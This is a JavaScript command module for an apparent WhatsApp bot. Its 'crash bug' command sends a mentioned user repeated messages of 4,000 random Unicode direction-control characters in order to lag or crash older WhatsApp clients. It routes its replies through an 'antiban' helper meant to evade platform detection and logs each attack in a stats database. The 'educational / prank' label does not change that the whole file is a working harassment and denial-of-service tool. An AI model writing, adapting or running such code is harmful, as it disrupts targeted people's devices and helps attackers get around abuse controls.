/**
 * 🐛 Tech God Bug 2026 — Crash Bug
 * Sends heavy Unicode messages to lag older WhatsApp builds.
 * ⚠️ EDUCATIONAL / PRANK USE ONLY
 * By Dev-Ntando
 */
'use strict';

const config  = require('../../config');
const antiban = require('../../utils/antiban');
const db      = require('../../database');

function generateHeavyText(intensity = 4000) {
  const chars = ['\u200e', '\u200f', '\u202a', '\u202c', '\u2069', '\u2068', '\u2067', '\u2066'];
  let text = '';
  for (let i = 0; i < intensity; i++) {
    text += chars[Math.floor(Math.random() * chars.length)];
  }
  return text;
}

module.exports = async (sock, msg, args, { isOwner, sender, jid, config: cfg, db: database }) => {
  if (!config.bugsEnabled.crash) {
    return antiban.sendHuman(sock, jid, { text: '❌ Crash bug is currently disabled.' }, { quoted: msg });
  }

  // Get target
  const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
  let target = mentioned[0] || (args[0] ? args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : null);

  if (!target) {
    return antiban.sendHuman(sock, jid, {
      text: `🐛 *Crash Bug*\n\n*Usage:* ${config.prefix}crash @user\n*Example:* ${config.prefix}crash @someone\n\n_Sends heavy Unicode to lag their WhatsApp._`,
    }, { quoted: msg });
  }

  const rounds = Math.min(parseInt(args[1]) || 3, 10);

  await antiban.sendHuman(sock, jid, { text: `🐛 *Sending crash bug...*\n🎯 Target: @${target.split('@')[0]}\n💣 Rounds: ${rounds}`, mentions: [target] }, { quoted: msg });

  for (let i = 0; i < rounds; i++) {
    await sock.sendMessage(target, { text: generateHeavyText(4000) });
    await new Promise(r => setTimeout(r, 400));
  }

  db.incrementStat('totalBugs');
  db.incrementUserStat(sender, 'bugs');

  await antiban.sendHuman(sock, jid, { text: `✅ *Crash bug sent!*\n🐛 ${rounds} rounds delivered to @${target.split('@')[0]}`, mentions: [target] }, { quoted: msg });
};
